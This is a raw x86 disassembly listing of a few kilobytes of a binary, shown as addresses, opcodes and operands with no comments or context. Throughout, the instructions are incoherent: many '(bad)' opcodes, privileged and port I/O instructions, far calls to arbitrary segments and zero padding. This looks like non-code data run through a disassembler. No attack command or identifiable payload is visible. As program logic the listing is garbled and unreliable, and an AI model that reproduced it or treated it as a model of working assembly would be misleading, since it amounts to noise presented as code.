  4235e4:	enter  0x3495,0x10
  4235e8:	mov    ebp,0x7bd8ef13
  4235ed:	(bad)  
  4235ee:	and    DWORD PTR [edi+0x42],ebp
  4235f1:	fcomp  QWORD PTR [esi+eiz*8+0x45e16c88]
  4235f8:	cmp    eax,0x9c481296
  4235fd:	add    esi,DWORD PTR [edx-0x320309c9]
  423603:	stos   DWORD PTR es:[edi],eax
  423604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423605:	jecxz  0x423641
  423607:	adc    DWORD PTR fs:[ebp-0x30],edx
  42360b:	dec    eax
  42360c:	es loopne 0x42362c
  42360f:	mov    ds:0x601077fb,eax
  423614:	test   eax,0x22f28d3d
  423619:	cli    
  42361a:	add    DWORD PTR [esi-0x56d4debe],esp
  423620:	popa   
  423621:	cmp    al,0x79
  423623:	jmp    0x4235b3
  423625:	jo     0x4235d6
  423627:	les    edi,FWORD PTR [eax-0x2e]
  42362a:	pop    edi
  42362b:	addr16 ret 0xb978
  42362f:	mov    al,0xfd
  423631:	and    al,BYTE PTR [ecx+ecx*2]
  423634:	cmp    ah,dl
  423636:	dec    edi
  423637:	shl    DWORD PTR [eax+0x1d],cl
  42363a:	pop    ebp
  42363b:	jns    0x42368d
  42363d:	xchg   edi,eax
  42363e:	adc    al,0x12
  423640:	int3   
  423641:	cli    
  423642:	xor    edx,DWORD PTR [bx+di+0x28b7]
  423647:	adc    dh,bl
  423649:	int    0x41
  42364b:	pop    ecx
  42364c:	or     edx,DWORD PTR ds:[edx-0xbdfc28]
  423653:	out    dx,eax
  423654:	leave  
  423655:	inc    edi
  423656:	sub    al,0x56
  423658:	pop    es
  423659:	push   esi
  42365a:	(bad)  
  42365b:	data16 hlt 
  42365d:	mov    eax,ds:0x85b2bd68
  423662:	ret    
  423663:	mov    ds:0xde8fdd85,eax
  423668:	nop
  423669:	sbb    ecx,DWORD PTR ds:0x3aa525a2
  42366f:	or     BYTE PTR [ebx+0x3c63052e],bl
  423675:	call   0xe9ac:0x6eb10dc8
  42367c:	xor    eax,DWORD PTR [edi]
  42367e:	nop
  42367f:	(bad)  
  423680:	call   0xfb7a:0x2ee3bb2d
  423687:	adc    al,0x4
  423689:	ficomp WORD PTR [ebp-0x4a]
  42368c:	xor    edi,DWORD PTR [ebp-0x29610683]
  423692:	mov    ds:0xbc570c52,al
  423697:	push   eax
  423698:	sbb    eax,0x8a5a01fb
  42369d:	mov    ds:0xbd403ebe,eax
  4236a2:	repz mov WORD PTR [edx],fs
  4236a5:	mov    ds:0x25d0444d,eax
  4236aa:	daa    
  4236ab:	popa   
  4236ac:	in     al,dx
  4236ad:	pop    esp
  4236ae:	(bad)  
  4236af:	rcl    BYTE PTR [ebx+0x24],1
  4236b2:	les    eax,FWORD PTR [esi]
  4236b4:	mov    dh,0x56
  4236b6:	pop    edi
  4236b7:	dec    ebp
  4236b8:	cmc    
  4236b9:	sub    cl,BYTE PTR [esi+0x22]
  4236bc:	cli    
  4236bd:	sbb    BYTE PTR [esp+edi*4+0x1],dh
  4236c1:	test   al,0xce
  4236c3:	gs push ds
  4236c5:	xor    eax,0xa81bf3d5
  4236ca:	stos   BYTE PTR es:[edi],al
  4236cb:	add    al,0xdc
  4236cd:	jl     0x4236cd
  4236cf:	pop    ss
	...
  4236d8:	add    BYTE PTR [eax],al
  4236da:	shl    BYTE PTR [edx],cl
  4236dc:	xchg   esi,eax
  4236dd:	call   0xe61:0x6adebef6
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	sub    DWORD PTR [edx+0x12],ebp
  4236e9:	pop    es
  4236ea:	fidiv  DWORD PTR [eax+0x1fe0001]
  4236f0:	add    BYTE PTR [eax],al
  4236f2:	add    al,BYTE PTR ds:0x85f974aa
  4236f8:	jge    0x4236b6
  4236fa:	retf   
  4236fb:	inc    esp
  4236fc:	adc    eax,DWORD PTR [esi-0x1413da70]
  423702:	push   ecx
  423703:	test   ecx,ebx
  423705:	bound  ebp,QWORD PTR [edx+edi*8-0x73]
  423709:	pop    ss
  42370a:	mov    eax,0x3944387f
  42370f:	test   edx,edx
  423711:	aas    
  423712:	loope  0x42377b
  423714:	or     eax,0xb3ab2926
  423719:	mov    ch,dl
  42371b:	adc    al,0x86
  42371d:	adc    DWORD PTR [ecx+0x5dac3978],edi
  423723:	retf   
  423724:	lock in al,0x46
  423727:	cmc    
  423728:	ss pop esp
  42372a:	mov    al,BYTE PTR [esi+0x7e]
  42372d:	pop    esp
  42372e:	cmp    BYTE PTR [esi+0x1e],0xde
  423732:	icebp  
  423733:	cmp    al,0x86
  423735:	jmp    0x42370f
  423737:	add    al,0xf4
  423739:	inc    ecx
  42373a:	jp     0x42375e
  42373c:	ja     0x423783
  42373e:	xchg   edx,eax
  42373f:	es adc eax,0xbcdd8611
  423745:	sub    eax,0xe1b51b1c
  42374a:	mov    edx,0xfee02d7a
  42374f:	(bad)  
  423750:	jne    0x42371b
  423752:	jge    0x4237bd
  423754:	mul    ah
  423756:	loop   0x42370c
  423758:	mov    ah,0xef
  42375a:	add    esi,DWORD PTR [ebp+0x7f]
  42375d:	enter  0x4af5,0x1c
  423761:	push   esi
  423762:	std    
  423763:	sub    eax,0xac523282
  423768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423769:	cmc    
  42376a:	clc    
  42376b:	(bad)  
  42376c:	cmp    al,dh
  42376e:	outs   dx,DWORD PTR ds:[esi]
  42376f:	lahf   
  423770:	sub    dl,BYTE PTR [esi-0x3d]
  423773:	fwait
  423774:	mov    fs,WORD PTR [edx-0x3e402a2f]
  42377a:	adc    DWORD PTR gs:[ebx+0x43],esi
  42377e:	xchg   ebp,eax
  42377f:	inc    eax
  423780:	into   
  423781:	push   edi
  423782:	push   cs
  423783:	je     0x42376c
  423785:	add    BYTE PTR [eax],dl
  423787:	or     ch,BYTE PTR [esi+esi*2]
  42378a:	xor    eax,0xd5bb7d18
  42378f:	idiv   DWORD PTR [edx+0x648a1916]
  423795:	(bad)  
  423796:	daa    
  423797:	in     ax,0x46
  42379a:	sub    DWORD PTR [eax-0x6b],ecx
  42379d:	fnstsw WORD PTR [ecx-0x7]
  4237a0:	add    al,bh
  4237a2:	mov    edi,0x1ee1f2ac
  4237a7:	and    BYTE PTR [ebx],bh
  4237a9:	mov    ecx,DWORD PTR [edi+0x0]
  4237ac:	mov    ds:0x3761306f,al
  4237b1:	add    BYTE PTR [esp+edx*8-0x24642406],bl
  4237b8:	mov    ah,0x74
  4237ba:	xchg   DWORD PTR [edx],esp
  4237bc:	lods   al,BYTE PTR ds:[esi]
  4237bd:	in     eax,dx
  4237be:	mov    bl,0xe8
  4237c0:	add    BYTE PTR [ebp+0x197a5489],ah
  4237c6:	sub    dh,al
  4237c8:	mov    al,0x58
  4237ca:	enter  0xb2ab,0x42
  4237ce:	(bad)  
  4237cf:	sub    eax,0xccea689c
  4237d4:	mov    bl,0x69
  4237d6:	ja     0x423806
  4237d8:	xchg   edi,eax
  4237d9:	xchg   edi,eax
  4237da:	(bad)  
  4237db:	push   ecx
  4237dc:	leave  
  4237dd:	jbe    0x423829
  4237df:	pop    ss
  4237e0:	test   DWORD PTR [edx-0x23],esp
  4237e3:	push   ds
  4237e4:	mov    bl,BYTE PTR [edx-0x143de5a2]
  4237ea:	adc    DWORD PTR [ebp+esi*8-0xc],esi
  4237ee:	xchg   ecx,eax
  4237ef:	push   0x109408b6
  4237f4:	xchg   ebx,eax
  4237f5:	cli    
  4237f6:	add    al,0x23
  4237f8:	mov    gs,ebx
  4237fa:	neg    BYTE PTR [edi+0x0]
  4237fd:	jae    0x423851
  4237ff:	mov    ch,0x92
  423801:	or     cl,ch
  423803:	fcom   QWORD PTR [ecx+0xbcf4abf]
  423809:	dec    ebx
  42380a:	in     eax,dx
  42380b:	inc    edi
  42380c:	dec    eax
  42380d:	sub    ebp,DWORD PTR [esi+0x55]
  423810:	hlt    
  423811:	outs   dx,BYTE PTR ds:[esi]
  423812:	cs push esi
  423814:	mov    ebx,DWORD PTR [edx+0x33964c43]
  42381a:	jg     0x42386b
  42381c:	in     al,0x94
  42381e:	sar    BYTE PTR [ebx-0xd],0xc
  423822:	inc    ecx
  423823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423824:	xchg   edi,eax
  423825:	mov    ds:0x7025ccdb,al
  42382a:	mov    eax,ds:0x85275f70
  42382f:	push   0xb8f85d32
  423834:	stc    
  423835:	dec    ebx
  423836:	pop    ss
  423837:	ins    DWORD PTR es:[edi],dx
  423838:	call   0x232d9563
  42383d:	fmul   QWORD PTR [esi-0x57]
  423840:	mov    bl,0xe3
  423842:	out    0x3e,eax
  423844:	jb     0x423821
  423846:	sub    al,0xa8
  423848:	lods   eax,DWORD PTR ds:[esi]
  423849:	add    al,0xc2
  42384b:	cwde   
  42384c:	pop    ebp
  42384d:	pop    edi
  42384e:	bnd jg 0x42382c
  423851:	test   eax,0x288481dd
  423856:	inc    ebx
  423857:	xor    eax,0x68676f1
  42385c:	(bad)  [ebp+0x653e9f4b]
  423862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423863:	xchg   ebx,eax
  423864:	adc    ecx,edx
  423866:	shl    BYTE PTR [edi+0x542d63b9],1
  42386c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42386d:	xchg   esp,eax
  42386e:	out    0x63,al
  423870:	popa   
  423871:	mov    dl,BYTE PTR [edx]
  423873:	into   
  423874:	adc    eax,0x4ef43224
  423879:	sbb    eax,0x5b570443
  42387e:	(bad)  
  42387f:	fstp   DWORD PTR [ebp+0x7a]
  423882:	fmul   DWORD PTR [edx+0x1f]
  423885:	test   BYTE PTR [esi],cl
  423887:	aam    0x9b
  423889:	mov    ds:0xbfecab0f,eax
  42388e:	mov    bh,0xea
  423890:	add    bl,BYTE PTR [edi+0x37]
  423893:	or     eax,0x912af8e1
  423898:	or     eax,0x6e04bb29
  42389d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42389e:	data16 fcom DWORD PTR [esi-0x69ff382e]
  4238a5:	push   esi
  4238a6:	retf   0x7a74
  4238a9:	pop    ebx
  4238aa:	dec    eax
  4238ab:	adc    ch,BYTE PTR [edx+0x70]
  4238ae:	(bad)  [ecx]
  4238b0:	mov    cl,0xde
  4238b2:	fcmovnb st,st(7)
  4238b4:	pusha  
  4238b5:	mov    cl,0xb8
  4238b7:	out    0xe7,eax
  4238b9:	fld    TBYTE PTR [edx+0x7cdb8f36]
  4238bf:	pop    ds
  4238c0:	mov    ebx,0xfc32870c
  4238c5:	(bad)  
  4238c7:	repz fs inc edx
  4238ca:	mov    ch,0xa9
  4238cc:	aam    0x39
  4238ce:	xchg   edi,eax
  4238cf:	cmp    DWORD PTR [esi+0x24225664],ebx
  4238d5:	jmp    0x4238a8
  4238d7:	lods   al,BYTE PTR ds:[esi]
  4238d8:	rcr    BYTE PTR [edx],0x32
  4238db:	add    al,0x4e
  4238dd:	(bad)  
  4238de:	stc    
  4238df:	push   es
  4238e0:	div    DWORD PTR [esi+0x43]
  4238e3:	or     dh,al
  4238e5:	push   ebp
  4238e6:	dec    esp
  4238e7:	test   DWORD PTR [esi],ecx
  4238e9:	aaa    
  4238ea:	or     ecx,0xc0f24ca8
	...
  4238f8:	add    BYTE PTR [eax],al
  4238fa:	fnstsw WORD PTR [edi+ecx*4]
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	dec    ebx
  423907:	aaa    
  423908:	sub    BYTE PTR [edi],bl
  42390a:	fdiv   DWORD PTR [edx+0x1fe0001]
  423910:	add    BYTE PTR [eax],al
  423912:	pop    ecx
  423913:	inc    ebx
  423914:	test   al,0x8c
  423916:	test   BYTE PTR [ecx-0x542c3ef3],dh
  42391c:	les    edx,FWORD PTR [esi-0x7a]
  42391f:	cmp    cl,dh
  423921:	mov    dl,0xcb
  423923:	dec    esp
  423924:	aaa    
  423925:	sub    BYTE PTR [esi],bh
  423927:	es add eax,0x40ba98a4
  42392d:	js     0x42391e
  42392f:	cmp    al,dl
  423931:	sub    bl,BYTE PTR [ecx]
  423933:	jmp    FWORD PTR [ebx+0x0]
  423936:	sbb    DWORD PTR [edi+0x292677d1],esi
  42393c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42393d:	in     al,dx
  42393e:	retf   0x2e6e
  423941:	or     eax,0x205f3781
  423946:	dec    esi
  423947:	cwde   
  423948:	inc    esi
  423949:	js     0x4238dc
  42394b:	mov    eax,ds:0x4e665cbe
  423950:	jecxz  0x4239c9
  423952:	rol    DWORD PTR [edx+edi*4],0x57
  423956:	outs   dx,BYTE PTR ds:[esi]
  423957:	sbb    eax,0x8c1b1aab
  42395c:	daa    
  42395d:	jl     0x42393b
  42395f:	sbb    DWORD PTR [eax-0x1caf67c9],eax
  423965:	sahf   
  423966:	inc    ebx
  423967:	xchg   edi,ebx
  423969:	xchg   ebp,eax
  42396a:	lods   eax,DWORD PTR ds:[esi]
  42396b:	jle    0x423904
  42396d:	push   ss
  42396e:	push   esi
  42396f:	or     esi,DWORD PTR [ebp-0x57]
  423972:	sub    eax,0x92f422c5
  423977:	fcom   DWORD PTR [edi+eiz*8]
  42397a:	aas    
  42397b:	inc    eax
  42397c:	adc    cl,BYTE PTR [ecx+eiz*1+0x40cbef8c]
  423983:	scas   al,BYTE PTR es:[edi]
  423984:	repnz aaa 
  423986:	std    
  423987:	or     eax,0x2b37f80b
  42398c:	sbb    dh,cl
  42398e:	cmp    ah,bh
  423990:	dec    ebp
  423991:	jp     0x4239b7
  423993:	dec    edx
  423994:	sub    al,0x6f
  423996:	mov    bh,0x92
  423998:	add    dh,BYTE PTR [edx+0x56]
  42399b:	adc    eax,0x7377cf31
  4239a0:	iret   
  4239a1:	lods   eax,DWORD PTR ds:[esi]
  4239a2:	sub    bh,ah
  4239a4:	lock jns 0x423a13
  4239a7:	scas   al,BYTE PTR es:[edi]
  4239a8:	aas    
  4239a9:	pop    ds
  4239aa:	mov    fs,WORD PTR [ecx]
  4239ac:	and    eax,0x108606b3
  4239b1:	lahf   
  4239b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239b3:	sub    ch,0x35
  4239b6:	(bad)  
  4239b7:	(bad)  
  4239b8:	aad    0x1f
  4239ba:	dec    esp
  4239bb:	xchg   edi,eax
  4239bc:	rcr    BYTE PTR [ebx],1
  4239be:	lahf   
  4239bf:	inc    esp
  4239c0:	sbb    eax,0x4f805193
  4239c5:	jmp    0x57b033e9
  4239ca:	adc    edi,DWORD PTR [ecx-0x13]
  4239cd:	mov    BYTE PTR [edi],ch
  4239cf:	sub    eax,0x11ba2a51
  4239d4:	(bad)  
  4239d5:	je     0x42398a
  4239d7:	outs   dx,DWORD PTR ds:[esi]
  4239d8:	xchg   esp,eax
  4239d9:	mov    edx,0x5c7f1f4e
  4239de:	sub    dl,BYTE PTR [ecx]
  4239e0:	or     DWORD PTR [ecx-0x1858d649],ebx
  4239e6:	sbb    esi,DWORD PTR ds:[ebx]
  4239e9:	cmp    DWORD PTR ds:0x94ad3b95,esi
  4239ef:	fcom   DWORD PTR es:[esi-0x74]
  4239f3:	or     eax,0x5c9442d2
  4239f8:	and    BYTE PTR [ecx+0x20],al
  4239fb:	mov    cl,0xa1
  4239fd:	mov    ebx,?
  4239ff:	push   ds
  423a00:	hlt    
  423a01:	and    eax,0x603f4c9f
  423a06:	retf   0x18b5
  423a09:	test   eax,0x4043036b
  423a0e:	cmp    ch,BYTE PTR [ebp-0x59]
  423a11:	sub    DWORD PTR cs:[ebx+eax*8-0x4a170189],ebx
  423a19:	dec    ebx
  423a1a:	add    bl,BYTE PTR [esi+edx*4]
  423a1d:	or     al,0x26
  423a1f:	test   BYTE PTR [edx+0x44],0x40
  423a23:	out    0x4c,eax
  423a25:	xor    BYTE PTR [eax+eax*2+0x4f],ah
  423a29:	inc    edi
  423a2a:	popf   
  423a2b:	xor    BYTE PTR [ebx],al
  423a2d:	mov    ebp,DWORD PTR [ebx+0x9946ca0]
  423a33:	push   ebp
  423a34:	sbb    cl,BYTE PTR [esi+ebx*4-0x4d]
  423a38:	int3   
  423a39:	out    0x7e,al
  423a3b:	(bad)  
  423a3c:	jmp    0x339a5bcd
  423a41:	mov    esp,DWORD PTR [edi-0x4314c38b]
  423a47:	mov    al,0x3e
  423a49:	mov    dh,BYTE PTR [edi+0x62]
  423a4c:	xor    edx,DWORD PTR [ebp-0x6b]
  423a4f:	or     ebp,0x66
  423a52:	cmp    al,0xca
  423a54:	xor    eax,0xe6c3fc
  423a59:	adc    dh,bl
  423a5b:	xchg   edx,eax
  423a5c:	mov    ss,eax
  423a5e:	pop    es
  423a5f:	int3   
  423a60:	pop    edi
  423a61:	pop    ss
  423a62:	lods   eax,DWORD PTR ds:[esi]
  423a63:	and    ch,BYTE PTR [eax+0x1c]
  423a66:	add    dh,BYTE PTR [ecx-0x60]
  423a69:	mov    ah,0xe7
  423a6b:	mov    DWORD PTR [ebx-0x6200febe],edx
  423a71:	inc    eax
  423a72:	sti    
  423a73:	jno    0x423ac1
  423a75:	cwde   
  423a76:	xchg   ebx,eax
  423a77:	adc    cl,BYTE PTR [edi]
  423a79:	add    DWORD PTR [ebp+0x4356ef51],ebx
  423a7f:	xchg   ebp,eax
  423a80:	sub    DWORD PTR [esi+0x62],0x67f6aabc
  423a87:	lock cmc 
  423a89:	jge    0x423a71
  423a8b:	mov    bh,BYTE PTR [esi]
  423a8d:	push   0x40
  423a8f:	jno    0x423aa0
  423a91:	pop    ebp
  423a92:	int3   
  423a93:	xor    esi,DWORD PTR [ecx+0x1]
  423a96:	dec    edx
  423a97:	jmp    0x423a82
  423a99:	adc    edi,DWORD PTR [eax]
  423a9b:	push   ecx
  423a9c:	push   esp
  423a9d:	dec    ebp
  423a9e:	outs   dx,DWORD PTR ds:[esi]
  423a9f:	mov    ecx,0xd84fd6a1
  423aa4:	or     BYTE PTR [edx-0x12],bl
  423aa7:	push   ebx
  423aa8:	fild   WORD PTR [eax-0x354452f8]
  423aae:	and    BYTE PTR [edx+0x13],dh
  423ab1:	mov    al,ds:0x9b89a32b
  423ab6:	and    esi,esp
  423ab8:	sbb    esp,DWORD PTR [edi+0x11]
  423abb:	not    bh
  423abd:	jno    0x423a78
  423abf:	imul   esp,DWORD PTR [edi],0xffffff98
  423ac2:	xchg   esp,eax
  423ac3:	cs push esp
  423ac5:	pop    ds
  423ac6:	lahf   
  423ac7:	pop    ds
  423ac8:	xor    DWORD PTR [eax-0x69],edi
  423acb:	mov    ebp,0xc0fd7c3b
  423ad0:	int    0xbb
  423ad2:	mov    ds:0x62303b93,eax
  423ad7:	mov    bh,0xff
  423ad9:	iret   
  423ada:	icebp  
  423adb:	fisttp QWORD PTR [esi]
  423add:	jns    0x423b20
  423adf:	sbb    edi,DWORD PTR [eax-0x41]
  423ae2:	cld    
  423ae3:	sbb    eax,DWORD PTR [eax-0x27]
  423ae6:	dec    ebp
  423ae7:	enter  0x247c,0xa
  423aeb:	call   DWORD PTR [ebx-0x68ef3770]
  423af1:	das    
  423af2:	pop    edi
  423af3:	test   BYTE PTR [eax],ah
  423af5:	pop    ebp
  423af6:	and    eax,0x8d8b0faf
  423afb:	mov    BYTE PTR [edx+0x1ce6239d],dl
  423b01:	xchg   ecx,eax
  423b02:	jo     0x423b81
  423b04:	sysexit 
  423b06:	mov    ah,0xb6
  423b08:	out    dx,al
  423b09:	outs   dx,DWORD PTR ds:[esi]
  423b0a:	ret    0x506f
  423b0d:	push   edx
  423b0e:	adc    ch,BYTE PTR [ebx]
	...
  423b18:	add    BYTE PTR [eax],al
  423b1a:	mov    dh,0xdf
  423b1c:	fwait
  423b1d:	add    bh,bl
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423b20
  423b27:	mov    edx,0xb4d6929e
  423b2c:	add    DWORD PTR [eax],eax
  423b2e:	inc    BYTE PTR [ecx]
  423b30:	add    BYTE PTR [eax],al
  423b32:	ret    0x7d47
  423b35:	dec    eax
  423b36:	adc    edx,DWORD PTR [edx-0x51164fa3]
  423b3c:	ds repz sbb ebx,esi
  423b40:	or     edi,edx
  423b42:	div    edi
  423b44:	cwde   
  423b45:	cmp    DWORD PTR [edx],eax
  423b47:	xchg   ebp,eax
  423b48:	xor    al,0x4e
  423b4a:	mov    dl,0x8
  423b4c:	mov    edi,0x51a73978
  423b51:	push   cs
  423b52:	in     al,0xdc
  423b54:	sub    eax,0x79dd9960
  423b59:	pop    esi
  423b5a:	push   es
  423b5b:	and    al,0x2c
  423b5d:	ret    0xb5a9
  423b60:	in     eax,0xbe
  423b62:	loope  0x423bc3
  423b64:	mov    bh,0xc4
  423b66:	add    al,0xd0
  423b68:	dec    edi
  423b69:	cmc    
  423b6a:	pop    ecx
  423b6b:	mov    esp,0x6f4edd
  423b70:	or     BYTE PTR [edi+0x51cb6b1c],bl
  423b76:	aam    0xcc
  423b78:	loop   0x423b15
  423b7a:	push   ebp
  423b7b:	iret   
  423b7c:	mov    bh,0x7b
  423b7e:	rcl    al,1
  423b80:	in     al,dx
  423b81:	add    bl,BYTE PTR [ecx+0x1e]
  423b84:	cmp    al,0x52
  423b86:	aam    0x8
  423b88:	fnstenv cs:[ecx-0x79]
  423b8c:	daa    
  423b8d:	jecxz  0x423bc8
  423b8f:	push   eax
  423b90:	pusha  
  423b91:	bnd jg 0x423b64
  423b94:	sbb    ah,BYTE PTR [ebx+0x54]
  423b97:	and    DWORD PTR [edx-0x1a],edi
  423b9a:	js     0x423c15
  423b9c:	bound  edi,QWORD PTR [esi+0x54e3c84e]
  423ba2:	ja     0x423bbc
  423ba4:	add    edx,DWORD PTR [esi]
  423ba6:	jmp    0x423bbf
  423ba8:	test   DWORD PTR [ebx+0x62],0x15fdf92e
  423baf:	mov    WORD PTR [esi-0x1b],es
  423bb2:	aad    0x0
  423bb4:	dec    ebx
  423bb5:	add    edx,DWORD PTR [ecx+0x51]
  423bb8:	fcom   DWORD PTR [eax-0x64]
  423bbb:	hlt    
  423bbc:	sub    al,0xe8
  423bbe:	call   0x6012:0x62d5b9cf
  423bc5:	sub    BYTE PTR [ecx-0x7],bh
  423bc8:	outs   dx,BYTE PTR ds:[esi]
  423bc9:	test   al,0x86
  423bcb:	popa   
  423bcc:	and    BYTE PTR [ecx-0x3a],ah
  423bcf:	mov    ch,0xf7
  423bd1:	cld    
  423bd2:	fcmovbe st,st(3)
  423bd4:	inc    esp
  423bd5:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  423bd7:	xor    ebp,edi
  423bd9:	adc    DWORD PTR [eax+0xe1874f2],ebx
  423bdf:	jnp    0x423c54
  423be1:	jae    0x423bb6
  423be3:	adc    edx,DWORD PTR ds:0xa31be527
  423be9:	mov    edx,0x82100c08
  423bee:	xchg   esi,eax
  423bef:	ror    DWORD PTR [ecx-0x66],0x5c
  423bf3:	pop    es
  423bf4:	mov    eax,ds:0x718c7f99
  423bf9:	add    dh,dl
  423bfb:	xchg   ecx,eax
  423bfc:	and    cl,dl
  423bfe:	cmp    bh,BYTE PTR [ecx+0x7d]
  423c01:	push   edx
  423c02:	sub    BYTE PTR [ebx],dh
  423c04:	cmp    BYTE PTR [eax+0x26],0x6a
  423c08:	inc    ebp
  423c09:	mov    ebx,0xb69ec5c4
  423c0e:	sbb    BYTE PTR [esi+eax*8],al
  423c11:	jo     0x423bb5
  423c13:	aam    0xb4
  423c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c16:	mov    cl,0xa2
  423c18:	repnz cmp BYTE PTR [edx],cl
  423c1b:	sbb    eax,0xcc5f4faa
  423c20:	sub    dh,BYTE PTR [eax]
  423c22:	test   eax,0x18c6b94e
  423c27:	in     eax,dx
  423c28:	sub    dl,BYTE PTR [ecx]
  423c2a:	nop
  423c2b:	and    al,0x22
  423c2d:	jbe    0x423c61
  423c2f:	lock int3 
  423c31:	sub    DWORD PTR [edx-0x1fe67965],0x1c416361
  423c3b:	adc    ch,BYTE PTR ds:0x11e17240
  423c41:	jnp    0x423ca8
  423c43:	push   cs
  423c44:	test   BYTE PTR es:[eax+0x59df925c],ah
  423c4b:	mov    eax,ds:0x5fb2957a
  423c50:	in     eax,0xb9
  423c52:	inc    edi
  423c53:	add    BYTE PTR [ebx],al
  423c55:	dec    esp
  423c56:	bound  edx,QWORD PTR [eax+0x60990a35]
  423c5c:	cmp    al,0x23
  423c5e:	stc    
  423c5f:	cwde   
  423c60:	nop
  423c61:	neg    BYTE PTR [esi+0x24043b93]
  423c67:	mov    al,ds:0x324ff90c
  423c6c:	pslld  mm3,QWORD PTR [ebx-0x34]
  423c70:	push   0xd6705bb1
  423c75:	cmp    al,0x4d
  423c77:	sub    al,0xfc
  423c79:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c7b:	dec    eax
  423c7c:	sahf   
  423c7d:	stc    
  423c7e:	and    eax,0x247eb360
  423c83:	xchg   ebp,eax
  423c84:	mov    WORD PTR [ebp+esi*4-0x30],ss
  423c88:	xor    DWORD PTR [edi+0x72],edx
  423c8b:	ret    0xaf97
  423c8e:	mov    edx,0x82188d76
  423c93:	data16 and al,0x58
  423c96:	and    eax,0x5d23ce8c
  423c9b:	jb     0x423c9c
  423c9d:	js     0x423ce6
  423c9f:	(bad)  
  423ca0:	mov    ah,0xd0
  423ca2:	(bad)  
  423ca3:	ins    BYTE PTR es:[edi],dx
  423ca4:	adc    BYTE PTR [esi-0x2e52f6f],0xd7
  423cab:	dec    ebx
  423cac:	jl     0x423cf4
  423cae:	sub    DWORD PTR [ecx-0x32],edi
  423cb1:	sub    DWORD PTR [esi+0x3e],esi
  423cb4:	icebp  
  423cb5:	xchg   ebx,eax
  423cb6:	and    eax,0xc2b0484f
  423cbb:	mov    al,0x8d
  423cbd:	fst    QWORD PTR [edi+0xda337bc]
  423cc3:	retf   0x9ffe
  423cc6:	pop    es
  423cc7:	cmp    ah,cl
  423cc9:	test   al,0x78
  423ccb:	mov    DWORD PTR [edi],edi
  423ccd:	or     BYTE PTR [ebp-0x24],bl
  423cd0:	and    esi,DWORD PTR [edi-0x7e]
  423cd3:	push   ecx
  423cd4:	lods   eax,DWORD PTR ds:[esi]
  423cd5:	das    
  423cd6:	(bad)  
  423cd7:	or     DWORD PTR [edi-0x2e0de1a0],ebp
  423cdd:	fwait
  423cde:	mov    eax,0x6592ad1e
  423ce3:	add    eax,0x8c8f1fb9
  423ce8:	mov    esi,DWORD PTR [edx+esi*2]
  423ceb:	lds    edi,FWORD PTR [edi]
  423ced:	jo     0x423cdd
  423cef:	pop    edi
  423cf0:	push   ds
  423cf1:	ret    
  423cf2:	xchg   esp,eax
  423cf3:	repz into 
  423cf5:	xchg   edi,eax
  423cf6:	mov    ch,0xc1
  423cf8:	dec    edx
  423cf9:	popa   
  423cfa:	adc    edx,edx
  423cfc:	and    al,0xcd
  423cfe:	call   0xfdde:0xf30cbe4
  423d05:	clc    
  423d06:	push   eax
  423d07:	ja     0x423cca
  423d09:	dec    DWORD PTR [edi]
  423d0b:	sbb    al,0xe0
  423d0d:	imul   ecx,DWORD PTR [esi-0x7411ead9],0x61
  423d14:	nop
  423d15:	jae    0x423d79
  423d17:	scas   al,BYTE PTR es:[edi]
  423d18:	addr16 push 0xffffffc5
  423d1b:	jle    0x423d33
  423d1d:	jecxz  0x423cc5
  423d1f:	jg     0x423ca1
  423d21:	cmc    
  423d22:	sbb    edx,DWORD PTR [ecx-0x25]
  423d25:	daa    
  423d26:	cmp    esi,DWORD PTR [ebp-0x2c5552c3]
  423d2c:	adc    cl,bh
  423d2e:	pop    ss
  423d2f:	dec    ecx
	...
  423d38:	add    BYTE PTR [eax],al
  423d3a:	clc    
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0xd957ffb2
  423d47:	mov    DWORD PTR [ebx+eiz*2-0x2c],esp
  423d4b:	mov    dh,0x1
  423d4d:	add    dh,bh
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    ah,dl
  423d53:	xor    ch,BYTE PTR [ecx+esi*1]
  423d56:	jne    0x423d33
  423d58:	loope  0x423d25
  423d5a:	imul   eax,DWORD PTR [eax+0x3e],0xffffff93
  423d5e:	and    al,0xc0
  423d60:	mov    ebx,0x3fd27511
  423d65:	repnz xor ah,al
  423d68:	xor    bl,ah
  423d6a:	add    DWORD PTR [edi+0x420d0b8d],edx
  423d70:	shl    DWORD PTR [edi-0x51d48b55],cl
  423d76:	mov    bh,BYTE PTR [edx+0x6f57e86c]
  423d7c:	sbb    DWORD PTR [edx],ebx
  423d7e:	(bad)  
  423d7f:	mov    WORD PTR [esi-0x7e],fs
  423d82:	int3   
  423d83:	pop    ebx
  423d84:	push   ebx
  423d85:	inc    esp
  423d86:	cmp    al,0xd1
  423d88:	cmp    ebx,0x885cc799
  423d8e:	arpl   WORD PTR [ebx],si
  423d90:	and    BYTE PTR [eax-0x724cf431],bh
  423d96:	loop   0x423d6e
  423d98:	or     cl,BYTE PTR [esi+edi*8+0x32e13755]
  423d9f:	and    al,0x27
  423da1:	loop   0x423dfc
  423da3:	in     eax,0x67
  423da5:	adc    al,0x15
  423da7:	mov    DWORD PTR [eax],ebp
  423da9:	adc    ebp,DWORD PTR [edi+0x5de4c1ee]
  423daf:	mov    bl,0x3d
  423db1:	push   cs
  423db2:	pop    ebp
  423db3:	adc    ebp,0x24
  423db6:	mov    esp,0x497ec696
  423dbb:	mov    ecx,0xea121f68
  423dc0:	mov    edi,0x3dc45b3f
  423dc5:	out    0x6e,eax
  423dc7:	dec    esp
